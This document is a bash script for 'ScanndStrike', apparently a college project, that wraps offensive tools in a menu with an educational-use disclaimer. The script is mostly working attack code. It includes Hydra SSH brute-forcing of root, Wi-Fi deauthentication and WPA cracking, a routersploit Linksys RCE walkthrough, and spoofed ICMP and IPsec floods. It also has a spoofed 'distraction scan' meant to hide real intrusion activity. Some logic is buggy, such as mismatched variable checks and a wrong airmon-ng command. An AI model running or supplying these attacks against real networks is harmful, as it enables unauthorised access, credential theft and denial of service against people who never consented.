#!/bin/bash

PS3="scannstrike>" #prompt used to identify the program and tell the user they aren't running a bash script

#Create the ScanndStrike Menu
#Launch the start/main menu
homemenu()
{
#create a menu for the program using bash select, create sub menus within that can be used to run various modules
echo "WARNING: Performing any of the techniques contained in this script against a network, device or organization without permission is a criminal offense. These techniques are to be  conducted ethichally and in line  with the law"
echo ""
echo "Any Violation of these laws is not condoned by the Project creator as this project was created for educational purposes only as part of a college project"
echo ""
echo "Now that the elephant in the room has been addressed ! Be safe and I hope you enjoy trying these techniques on your own networks and devices"
echo ""
homemenu=("Perform Recon" "Execute Denial of Service Attacks" "Execute Attacks on Smart Devices"  "Exit") #creates the sub menu and the output shown to the user
select opt in "${homemenu[@]}"; do
        if [ "$opt" = "Exit" ]; then
        echo "Quitting...Thank you for using scanndstrike!" && sleep 1 && clear
        exit 0
        elif [ "$opt" = "Perform Recon" ]; then
        echo ""
        echo "What type of Reconassaince would you like to conduct?"
        echo ""
        echo "To choose a certain module enter the number assigned to it and press Enter !"
        echo ""
        netreconmenu
        elif [ "$opt" = "Execute Denial of Service Attacks" ]; then
        echo ""
        echo "What type of Denial of Service attack would you like to perform?"
        echo ""
        echo "To choose a certain module enter the number assigned to it and hit Enter!"
        echo ""
        dosattackmenu
        elif [ "$opt" = "Execute Attacks on Smart Devices" ]; then
        echo ""
        echo "Here I have included some very cool hacking techniques you can perform on your own network and devices to test your security and discover how easy it can be for a hacker to access your information."
        echo ""
        echo "The majority of these modules will require either a Raspberry Pi running Kali Linux or a Virtual Box Running Kali Linux with a bluetooth Adapter configured to be ran correctly."
        echo ""
        echo "To choose a certain module enter the number assigned to it and hit Enter."
        echo ""
        ethhackmenu
        else
#if no valid option is chosen, chastise the user
        echo "To exit this tool hit Return/Enter! Thank you"
        fi
done
}
#End of HomeMenu Code

#################
# Sub Menu Code #
#################

#Start of the EthHack Menu Code
ethhackmenu()
{
#build a menu for theb attack modules using bash select
                ethhackmenu=( "SSH Exploit Hydra + Nmap" "Wifi Password Cracking" "Wordlist Creation" "Bluetooth Targeting" "Router Exploitation" "Go back")
        select ethopt in "${ethhackmenu[@]}"; do

#SSH Exploitation using Hydra and nmap
    if [ "$ethopt" = "SSH Exploit Hydra + Nmap" ]; then
        sshydra  

#Perform Wifi Cracking with WIFITE
    elif [ "$ethopt" = "Wifi Password Cracking" ]; then
        passcrack

#Create a custom wordlist for password cracking tools
    elif [ "$ethopt" = "Wordlist Creation" ]; then
        crunchlist

#Perform attacks on Bluetooth devices
    elif [ "$ethopt" = "Bluetooth Targeting" ]; then
        bluebite

#Perfrom Recon on a Router and exploit any available vulnerabilities
    elif [ "$ethopt" = "Router Exploitation" ]; then
        routerexp
#Go back
        elif [ "$ethopt" = "Go back" ]; then
                homemenu
## Default if no menu option selected is to return an error
        else
                echo  "That's not a valid option! Hit Return/Enter to show menu"
        fi
        done
}

#Start of Routersploit Code
routerexp()
{
echo "Lets see if this works hm"
cd routersploit
echo "The next command is going to launch routersploit. In order to use routersploit correctly run the following commands in order:"
echo ""
echo "1. use scanners/routers/router_scan"
echo "2. show options"
echo "3. set target <Target IP/Hostname>"
echo "Example: set target 192.168.0."
echo "4. run"
echo ""
echo "Once the target has been scanned any vulnerablities will be shown along with the exploits that can be used on them"
echo "A typical exploit available is eseries_themoon_rce"
echo "To successfully exploit the router you essentially repeat the steps above as they are"
echo ""
echo "1. use exploits/routers/linksys/eseries_themoon_rce"
echo "2. show options" 
echo "3. set target <Vulnerability IP>"
echo "4. set port 81"
echo "5. run"
echo "" 
echo "If successful in your exploit you will be able to access the devices cmd where you can perform Blind Command Injection"
sudo  python3 rsf.py
echo ""
}
#End of Routersploit Code

#Start of Wifi password cracking code
passcrack()
{
echo "In order to crack your Wifi Password we can use Aircrack-ng while this program does automate some of the proccesses this module will require some interaction from you !"
echo "To start please open two additional terminal windows these will be used to run a total of 3 commands that will be provided for you ! You will just need to copy, paste and run them !"
ifconfig 
echo "As you can see above we have wlan0 this needs to become wlan0mon so we can begin our password cracking attack. This can be changed with the command:"
echo "      "
echo "sudo airmon-ng start wlan0"
echo "    "
echo "The following commands should be run only if your first attempt at this password attack is stopped due to an error:"
echo "    "
echo "1. sudo aircrack-ng start wlan0" 
echo "2. sudo Ifconfig wlan0mon down "
echo "3. sudo iwconfig wlan0mon mode monitor" 
echo "4. sudo ifconfig wlan0mon up "
echo "  "
echo "Now that your system is ready to begin cracking your WIFIpassword we can begin with our first command "
echo "Copy and paste the following command into the terminal window you had previously opened and press Enter. Command: sudo airodump-ng wlan0mon"
echo "When this is running you will see of all the available Wireless Networks within range. You will notice theres also information about these networks such as a unique BSSID, Channel (CH), Data etc"
echo "   "
read -i $TARGET -e TARGET
read -i $CHANNEL -e CHANNEL
read -i $FILE -e FILE
echo "Now it is important that you follow this next step closely. In one of your open terminal windows paste the command: sudo airmon-ng -w" $FILE "-c" $CHANNEL "--bssid" $TARGET "wlan0mon"
echo "Before you run that command ensure you have your second terminal window open and have th command: Sudo airoplay-ng -â€“deauth 0 -a " $TARGET "wlan0mon pasted in"
echo "Now begin running both of these commands on focus on the terminal with the airmon-ng command, and look for a WPA Handshake message to appear above the current information displayed"
echo "Have you successful been shown the WPA Handshake capture message? [Y]es , [N]o"
read -i $ANS -e ANS
if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
                echo "You must enter a valid answer"
                elif [ "$ANS" = "y" ]; then  
                echo "Do you have a [c]ustom  wordlist you would like to use against the target network or would you liew to use the [d]efault wordlist?"
                read -i $CHOICE -e  CHOICE
                if [ "$CHOICE" = "c" ]; then
                echo "PLease enter the name and location of your wordlist e.g if your wordlist is stored in Documents enter Documents/ followed by the name of your wordlist"
                read -i $LIST -e LIST
                sudo aircrack-ng $LIST $FILE-01.cap
                elif [ "$CHOICE" = "d" ]; then
                sudo aircrack-ng rockyou.txt $FILE-01.cap
                else echo "Not a valid option! Using default list instead "
                echo ""
                sudo aircrack-ng rockyou.txt $FILE-01.cap
                fi
                elif [ "$SOURCE" = "n" ]; then
                echo "Since WPA Handshake was not captured we will need to restart the machine to try the process again"
                else echo "Not a valid option! Therefore the process has been halted. Restart Required to try again "
                echo ""
                fi
echo ""
echo ""
}
#End of Wifi password cracking code

#Start of nmap and hydra code for SSH attack 
sshydra()
{
echo "Please enter a target hostname or IP address:"
#IP address/hostname of the target is required to begin
                 read -i $HOST -e HOST
#Here we are running a scan of all devices connected to the target network that have the ports 80, 81, 8080 and 8081 running
                sudo nmap $HOST/24 -p 80,81,8080,8081
#While this does return important information it also reveals alot about devices with closed ports that wont be useful to us so we can run a secondary scan to show only open ports excluding closed and filtered ports
sudo nmap $HOST/24 -p 80,81,8080,8081 --open
echo "From the list of target devices shown connected to the network choose ones IP address to perfrom further scans on"
read -i $TARGET -e TARGET 
echo "Now that you have chosen your target to attack we can run an advanced scan to reveal additional information about it"
#We use this scan to gather information about the services of the device and to try determine what the device is, is it a printer, router, raspberry pi etc.
sudo nmap -sV $TARGET
echo "Now that we have finished recon of the target we can begin the attack with Hydra"
#Define whether the user wants to use a custom wordlist, default wordlist, create a wordlist now, or run a fast ssh exploit with a default wordlist
echo "Hydra incorporates the use of password lists when attempting to break into a ssh connection this means custom wordlists/password lists  can be used based on information you may known about the victim of this attack"
echo "Enter the name of your wordlist, [d]efault wordlist, [c]reate a wordlist now and use it or [f]ast track the attack with default wordlist and port specification"
        read -i $SOURCE -e SOURCE
        : ${SOURCE:=i}
        if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
                echo "You must enter a valid textfile"
                hydra -l root -P  $SOURCE  $TARGET -t 4 ssh 
        elif [ "$SOURCE" = "d" ]; then
                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu"
                hydra -l root -P  /usr/share/wordlists/rockyou.txt  $TARGET -t 4 ssh 
        elif [ "$SOURCE" = "f" ]; then  
                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu"
                hydra -s 22 -l root -P  nowtest  $TARGET  -t 4 -e nsr ssh
        elif [ "$SOURCE" = "c" ]; then
                echo "PLease choose a name for your wordlist"
                read -i $LIST -e LIST
                echo "Now, please choose the string you wish to use for your list of combinations e.g if you enter 12ab you will be creating a list containing all possible combinations of the letters and numbers within that string"
                read -i $CRUNCH -e CRUNCH
                crunch 4 4 $CRUNCH  -o Documents/$LIST
                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu"
                hydra -l root -P  Documents/$LIST  $TARGET -t 4 ssh 
        else echo "Not a valid option! Using "
                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
                hydra -l root -P  /usr/share/wordlists/rockyou.txt  $TARGET -t 4 ssh 
        fi
}
#End of nmap and hydra ssh attack code

#Start of Worldlist creation code
crunchlist()
{
#The purpose of this module is to allow users to create wordlists which can be called upon later when attempting to penetrate a newtwork and its devices
echo "Here we can create lists that can be later called upon for password cracking using Crunch"
echo "Please enter the digits and characters you want this list to be made from e.g entering 123ABCabc will create a list of passwords made from every possible combination of this string"
read -i $CRUNCH -e CRUNCH
echo "Now that you have chosen the digits and characters for your password list you can assign a file for the passwords to be sent once compiled e.g mypass.txt"
read -i $TEXT -e  TEXT
crunch 4 4 $CRUNCH  -o Documents/$TEXT
echo ""
cat Documents/$TEXT
echo "You have  just created a password list ! These can be called upon when perfroming various penetration tests on your network/devices"
echo "You can view this password list by entering cd Documents/"$TEXT  "into the command line once you have exited this program"
}

#End of Wordlist creation code
bluebite()
{
#Start of Bluetooth Targeting code
echo "In order to snoop on a  target Bluetooth devices we first need to have a bluetooth adapater running so that is what we will do first"
#Check for bluetooth adapter
hciconfig
#Some Bluetooth adapters may already be running but for the purpose of the Project we will be using one that is offline to start
echo "If your hciconfig command returns no information then you need to reconfigure your bluetooth device"
echo "However in some cases the device is recognised but not running, so we will now run the device"
hciconfig hci0 up
echo "Blutooth device is now up and running !"
echo "Now we can scan for nearby bluetooth devices"
#Hcitool can be used to perfrom a scan for other bluetooth devices within range
hcitool scan
echo "From the device(s) shown please choose a MAC Address"
read -i $MAC -e MAC
#This will provide the name of the device as it will not always be discovered in the intial scan 
hcitool name $MAC
echo "Now that we have the devices name and MAC address the spd tool can be used to gather additional information about the target"
#Now that we known some information about the bluetooth target we can use a tool called sdp tool to query the device and gather additional information
sdptool browse $MAC
echo "You have now successfully snooped on a Bluetooth Device !"
}
#End of Bluetooth Targeting code

###############################################
#End of Ethichal Hacking Menu and Modules Code#
###############################################


#############################################
#Start of the NetRecon Menu and Modules Code#
#############################################

#Start of the NetRecon Menu Code
netreconmenu()
{
#build a menu for the recon modules using bash select
                netreconmenu=("Show IP" "Quick Scan" "Detailed Scan" "DNS Recon" "IP Sweep" "Ping Sweep" "Go back")
        select reconopt in "${netreconmenu[@]}"; do

#Display  users external IP & interface IP(s)
        if [ "$reconopt" = "Show IP" ]; then
                showip

#Perform Quick Recon on the Network
    elif [ "$reconopt" = "Quick Scan" ]; then
        quickscan
#Perform a stealthy scan on the Network
    elif [ "$reconopt" = "Detailed Scan" ]; then
        detailedscan

#DNS Recon
    elif [ "$reconopt" = "DNS Recon" ]; then
        dnsrecon
#DNS Recon
    elif [ "$reconopt" = "IP Sweep" ]; then
       ipsweep

#Ping Sweep
    elif [ "$reconopt" = "Ping Sweep" ]; then
        pingsweep
#Go back
        elif [ "$reconopt" = "Go back" ]; then
                homemenu
## Default if no menu option selected is to return an error
        else
                echo  "That's not a valid option! Hit Return to show menu"
        fi
        done
}
#End of the NetRecon Menu Code

###########################################
# Start of the Net Recon Menu Module Code #
###########################################

#Start of the ShowIP Code
showip()
{               echo "Curl is used to externally lookup the IP address"
                echo "The IP was externally detected as:"
#Lookup external IP using curl
                curl https://icanhazip.com/s/
                echo ""
                echo ""
#show interface IP's
                echo "Interface IP's are:"
                ip a|grep inet
#Revert to ifconfig command if the ip -a command fails
        if ! [[ $? = 0 ]]; then
                ifconfig|grep inet
        fi
                echo ""
}
#End of the ShowIP Code
#Start of the Quick Scan Code
quickscan()
{ echo "This module was designed to conducts a scan of an entire network using nmap to search for common open ports"
echo "A TCP SYN will be used to perform a scan of the 1000 most common ports"
echo "The duration of this scan may vary depending on the target chosen"
echo "Please enter the target subnet range or hostname:"
#While it is possible to scan a hostname, this module was designed for subnet range scanning
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
#How should the scan speed be decided? 
#Well the faster the scan is, the stronger the liklihood of the scan being detected by the IDS (Intrustion Detection System)
#However a slow scan means waiting a longer time period for results therefore the default scan speed would be 3.
read -i $SPEED -e SPEED
: ${SPEED:=3}
#Initiate the scan
sudo nmap -Pn -sS -T $SPEED $TARGET --reason
}
#End of the Quick Scan Code

#Start of the Detailed Scan code
detailedscan()
{ echo "This module implements the use of nmap to perform scans"
echo "While this module was created to perform a detailed scan of a specific target host it can also be used against an entire network"
echo "The nmap command used means that ALL ports on the target host are scanned and nmap attempts to detect the OS (Operating System) and service information"
echo "Due to the nature of this scan it may take a few minutes to complete so please have patience ! Perhaps make a coffee while you wait !"
echo "Please enter the IP address or name of the host you wish to scan"
#requires a target IP address/hostname
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
#How should the scan speed be decided? 
#Well the faster the scan is, the stronger the liklihood of the scan being detected by the IDS (Intrustion Detection System)
#However a slow scan means waiting a longer time period for results therefore the default scan speed would be 3.
read -i $SPEED -e SPEED
: ${SPEED:=3}
#THe scan is performed using nmap and the user agent is changed from nmaps default to decrease the risk of detection.
sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36  Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
}
#End of Detailed Scan Code



#Start of the DNS Recon Code
dnsrecon()
{ echo "This module executes passive recon commands through reverse and forward name searches (or lookups) for the target and performs a whois lookup"
        echo "Enter target:"
#need a target IP/hostname to check
        read -i $TARGET -e TARGET
host $TARGET
#Try the nslookup command if the host command is unresponsive
if ! [[ $? = 0 ]]; then
nslookup $TARGET
fi
#On the target run a whois search
sleep 1 && whois -H $TARGET
if ! [[ $? = 0 ]]; then
#Perform a curl look up of ip.info.io if the whois command fails
sleep 1 && curl ipinfo.io/$TARGET
fi
}
#End of DNS Recon Code

ipsweep()
{ echo "Enter a target IP to sweep and an assign a name to the textfile that will store this information"
echo "Example 192.168.1"
read -i $IPTARGET -e IPTARGET
echo "Now please enter the name you wish to assign to the document where these IPs will be stored"
echo "Example ipsweeplist.txt"
read -i $TXTFILE -e TXTFILE
for ip in `seq 1 254`; do
ping -c 1 $IPTARGET.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"  &
done > Documents/$TXTFILE
cat Documents/$TXTFILE
echo "IP Sweep completed list of Ips found can be shown using the command: cat Documents/"$TXTFILE "in the command line"
echo "To scan these IPs for open ports using nmap select the Detailed Scan option from the Menu"
}

#Start of the Ping Sweep Code
pingsweep()
{ echo "This module performs a simple ICMP 'ping' sweep"
        echo "Please enter the target. Example  192.168.0.1/24):"
#The subnet is required to scan for all live hosts with pings
        read -i $TARGET -e TARGET
#Use nmap to initiate the pingsweep command
#While the ping command could be used here instead of nmap, bash can sometimes have issues with this command when subnets are involved therefore nmap is the better choice
sudo nmap -sP -PE $TARGET --reason
}
#End of the Ping Sweep Code



############################################
#End of Network Recon Menu and Modules Code#
############################################


###############################
#Start of DOS Menu and Modules#
###############################

#Start of DoS Menu Code
dosattackmenu()
{
#display a menu for the DOS module using bash select
                dosattackmenu=("ICMP Flood"  "IPSEC Dos"  "Distraction Scan"  "Main Menu")
        select dosopt in "${dosattackmenu[@]}"; do
#ICMP Flood
        if [ "$dosopt" = "ICMP Flood" ]; then
                icmpflood
#IPsec  DOS
        elif [ "$dosopt" = "IPSEC Dos" ]; then
                ipsecdos
#Distraction scan
        elif [ "$dosopt" = "Distraction Scan" ]; then
                distractionscan
#Menu
        elif [ "$dosopt" = "Main Menu" ]; then
                homemenu
        else
#If no valid menu option selected an error is returned
        echo  "That's not a valid option! Hit Return/Enter to show menu"
        fi
done
}
#End of DoS Attack Menu Code

##################################
# Modules of the DoS Attack Menu #
##################################

#Start of ICMPFLOOD Code                                                                                                                                                                                                            2 â¨¯
icmpflood()
{
                echo "ICMP Flood launched using hping3"
                echo "Please enter a target hostname or IP address:"
#IP address/hostname of the target is required to begin
                read -i $TARGET -e TARGET
#Define whether the user wasnts to use a random, manual or outgoing interface IP
                echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
        read -i $SOURCE -e SOURCE
        : ${SOURCE:=i}
 if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
                echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                sudo hping3 -1 --flood --spoof $SOURCE $TARGET
        elif [ "$SOURCE" = "r" ]; then
                echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                sudo hping3 -1 --flood --rand-source $TARGET
        elif [ "$SOURCE" = "i" ]; then
                echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                sudo hping3 -1 --flood $TARGET
        else echo "Not a valid option!  Using interface IP"
                echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                sudo hping3 -1 --flood $TARGET
        fi
}
#End of IMPCFLOOD code


#Start of IPsec DoS Code
ipsecdos()
{ echo "This module will attempt to spoof an IPsec server, with a spoofed source address"
echo "Enter target IP or hostname:"
read -i $TARGET -e TARGET
#By default launch the Denial of Service Attack with a random source address
echo "IPsec Denial of Service running now.. to stop the DoS Attack use the 'Ctrl' + 'c' keys together" &&
while :
do sudo ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; sudo ike-scan -B 100M -t 1 -q --sourceip=random $TARGET 1>/dev/null
done
}
#End of the IPSEC DoS Code


#Start of Distraction Scan Code
distractionscan()
{ echo "This module will send a TCP SYN scan with a spoofed source address"
echo "This module is designed to be obvious, to distract your target from any real scan or other activity you may actually be performing"
echo "Enter target:"
#require a  target IP/hostname
read -i $TARGET -e TARGET
echo "PLease enter spoofed source address:"
#require a spoofed source address
read -i $SOURCE -e SOURCE
#use hping to perform multiple obvious scans we wish to get caught by the target
for i in {1..50}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
exit 0
}
#End of Distraction Scan Code

####################################
#End of DoS Attack Menu and Modules#
####################################


########################
##Opening Messages Code#
########################

#Display opening message
#since all the code above is being used to create functions (which must be defined before use) the opening message must be written as the last part of the script
#This is to avoid any functionality issues and makes for a cleaner script

        clear && echo ""
echo ""
figlet "ScanndStrike" | lolcat
echo ""
echo "Welcome to scanndstrike!"
echo "Please report all bugs, improvements and suggestions to https://github.com/Gareth-hub/EthichalHackingProject.git"
echo "This software is only was created as part of a college project and is authorised for educational use only."
echo "This project was conducted in line with legal requirements and is intended to be shared for educational purposes only"
echo "YOU are responsible for your own actions!"
echo ""
echo "Basic Commands:"
echo "A module can be stopped using the Ctrl and C keys"
echo "To exit a Module and return to its menu hit the Enter or Return Key Twice"
echo ""
echo ""
homemenu
#End Opening Message


